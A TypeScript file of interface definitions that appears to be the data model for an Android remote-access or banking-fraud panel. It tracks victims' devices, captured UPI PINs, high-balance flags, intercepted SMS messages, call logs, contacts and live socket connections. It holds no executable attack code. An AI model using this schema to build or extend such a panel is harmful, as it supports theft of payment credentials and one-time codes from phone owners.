export interface DeviceResponse {
  id: string;
  userId: string;
  deviceId: string;
  socketId?: string | null;
  modelName: string;
  androidV: string;
  isRoot: boolean;
  isSdCard: boolean;
  storage: string;
  sdkV: string;
  cpu_arch: string;
  battery: string;
  upi_pin?: string | null;
  FCM_Token?: string | null;
  callLogsUri?: String;
  contactsUri?: String;
  isReadCallLogs?: Boolean;
  isReadContacts?: Boolean;
  isHighBalance?: number | null;
  ipAddress: string;
  service_provider: string;
  mobNo: string | null;
  simData: SimCard[] | null;
  status: boolean;
  joined: String;
  lastSeen: String;
  note?: string;
  imgUrl?: string | null;
  isEmulator?: boolean;
}

export interface DeviceCounts {
  total: number;
  online: number;
  offline: number;
  withPin: number;
}

export interface PaginatedDevices {
  devices: DeviceResponse[];
  total: number;
  page: number;
  limit: number;
  totalPages: number;
}

export interface UpdateDeviceField {
  field: "status" | "battery" | "socketId" | "upi_pin" | "note";
  value: any;
}

export interface SmsMessageResponse {
  id: string;
  timestamp: Date;
  sender: string;
  textMessage: string;
  type: string;
  deviceId: string;
  userId: string;
}

export interface PaginatedSmsMessages {
  messages: SmsMessageResponse[];
  total: number;
  page: number;
  limit: number;
  totalPages: number;
}

export interface SmsCounts {
  total: number;
  incoming: number;
  outgoing: number;
}

interface SimCard {
  simSlotIndex: number;
  phoneNumber: string;
  carrierName: string;
}

export interface Device {
  id: string;
  userId: string;
  deviceId: string;
  socketId?: string | null;
  modelName: string;
  androidV: string;
  isRoot: boolean;
  isSdCard: boolean;
  storage: string;
  sdkV: string;
  cpu_arch: string;
  battery: string;
  upi_pin?: string | null;
  FCM_Token?: string | null;
  callLogsUri?: String;
  contactsUri?: String;
  isReadCallLogs?: Boolean;
  isReadContacts?: Boolean;
  isHighBalance?: number | null;
  ipAddress: string;
  service_provider: string;
  mobNo: string | null;
  simData: SimCard[] | null;
  status: boolean;
  joined: String;
  lastSeen: String;
  note?: string;
  imgUrl?: string | null;
  isEmulator?: boolean;
}

export interface Message {
  id: string;
  timestamp: Date;
  sender: string;
  textMessage: string;
  type: string;
  deviceId: string;
  userId: string;
}
